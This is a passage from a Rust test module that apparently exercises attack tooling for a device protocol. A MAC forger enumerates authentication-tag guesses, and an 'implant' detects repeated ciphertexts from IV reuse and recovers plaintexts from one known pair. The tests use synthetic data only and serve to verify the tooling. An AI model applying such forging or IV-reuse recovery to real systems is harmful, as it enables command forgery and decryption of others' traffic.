        assert_eq!(seen.len(), 256, "every value of the byte, exactly once");
        // And the counters are per sequence, so a different sequence starts
        // again from the beginning.
        assert_eq!(forger.next_guess(2), [0, 0, 0, 0]);
        // Nothing beyond the measured width is ever guessed: the wire says
        // those bytes are zero.
        assert_eq!(forger.next_guess(3)[1..], [0, 0, 0]);
    }

    #[test]
    fn an_unattached_forger_is_an_error_rather_than_a_panic() {
        let mut forger = MacForger::new("forger", 1, 0);
        assert!(matches!(
            forger.calibrate(),
            Err(AttackError::Exhausted { .. })
        ));
        assert!(forger.accepted().is_none());
        assert_eq!(forger.attempts(), 0);
        assert_eq!(forger.address(), 1);
    }

    #[test]
    fn an_epoch_finds_the_frames_that_share_a_ciphertext() {
        let exploiter = IvReuseExploiter::new("implant");
        {
            let mut st = exploiter.state.borrow_mut();
            let mut epoch = IvEpoch {
                index: 0,
                started_us: 0,
                frames: Vec::new(),
            };
            for (t, ct) in [
                (10u64, alloc::vec![1u8, 2, 3]),
                (20, alloc::vec![9, 9, 9]),
                (30, alloc::vec![1, 2, 3]),
                (40, alloc::vec![1, 2, 3]),
            ] {
                epoch.frames.push(EpochFrame {
                    t_us: t,
                    address: 1,
                    id: Command::Out.to_u8(),
                    sequence: 1,
                    ciphertext: ct,
                });
            }
            st.epochs.push(epoch);
        }
        let collisions = exploiter.collisions();
        assert_eq!(collisions.len(), 1, "only the repeated ciphertext");
        assert_eq!(collisions[0].at, alloc::vec![10, 30, 40]);
        assert_eq!(collisions[0].ciphertext, alloc::vec![1, 2, 3]);

        // With one plaintext anchored, the other two fall out.
        exploiter.learn(alloc::vec![1, 2, 3], alloc::vec![0xAA, 0xBB], 10);
        let recovered = exploiter.recover();
        assert_eq!(recovered.len(), 2, "the two the codebook did not come from");
        assert!(recovered.iter().all(|p| p.bytes == alloc::vec![0xAA, 0xBB]));
        assert_eq!(
            recovered.iter().map(|p| p.t_us).collect::<Vec<_>>(),
            alloc::vec![30, 40]
        );
    }

    #[test]
    fn an_exploiter_with_no_codebook_recovers_nothing() {
        let exploiter = IvReuseExploiter::new("implant");
        assert!(exploiter.recover().is_empty());
        assert!(exploiter.collisions().is_empty());
        assert_eq!(exploiter.suppressed(), 0);
    }
}
